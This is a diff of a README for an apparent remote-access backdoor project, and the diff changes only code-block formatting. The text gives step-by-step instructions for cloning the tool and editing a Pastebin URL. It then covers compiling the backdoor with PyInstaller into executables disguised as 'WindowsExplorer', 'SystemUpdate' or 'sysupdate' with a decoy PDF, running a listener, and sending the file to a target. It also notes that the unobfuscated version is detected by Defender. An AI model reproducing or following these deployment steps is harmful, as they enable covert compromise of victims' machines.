@@ -20,25 +20,25 @@ Unobfuscated backdoor will be detected and quarintined by defender
     ```zsh
    git clone https://github.com/Anonomous69/Backdoor
    pip install requests pillow pyautogui
-   ```
+    ```
 
    cd to that directory (also dont forget to change the [Pastebin.com](https://pastebin.com) URL)
 
 2. ### find your pyinstaller path and run :
 #### For windows :
-    ```powershell
-    C:\Users\wherever\your\path\is\pyinstaller.exe --onefile --noconsole --name "WindowsExplorer" --icon="icon.ico" ——version-file=version_info.txt --add-data "sample.pdf;." Unobfuscated\plain_backdoor.py
-    ```
+```powershell
+C:\Users\wherever\your\path\is\pyinstaller.exe --onefile --noconsole --name "WindowsExplorer" --icon="icon.ico" ——version-file=version_info.txt --add-data "sample.pdf;." Unobfuscated\plain_backdoor.py
+```
   
 #### For MacOS :    
-    ```zsh
-    /Users/path/to/pyinstaller --onefile --windowed --name "SystemUpdate" --icon="icon.icns" --add-data "sample.pdf:." backdoor.py
-    ```
+```zsh
+/Users/path/to/pyinstaller --onefile --windowed --name "SystemUpdate" --icon="icon.icns" --add-data "sample.pdf:." backdoor.py
+```
 
 #### For Linux :
-    ```shell
-    pyinstaller --onefile --noconsole --name "sysupdate" --icon="icon.png" --add-data "sample.pdf:." backdoor.py
-    ```
+```shell
+pyinstaller --onefile --noconsole --name "sysupdate" --icon="icon.png" --add-data "sample.pdf:." backdoor.py
+```
 
    If ran successfully the created executable will be in your newly created "Dist" directory
 
@@ -48,9 +48,9 @@ Unobfuscated backdoor will be detected and quarintined by defender
     ```
 
 4. ### Run Listener is your machine and send the backdoor to target
-   ```zsh
-   python listeenr.py
-   ```
+```zsh
+python listeenr.py
+```
  when target clicks backdoor, you get the connection
  
 ---
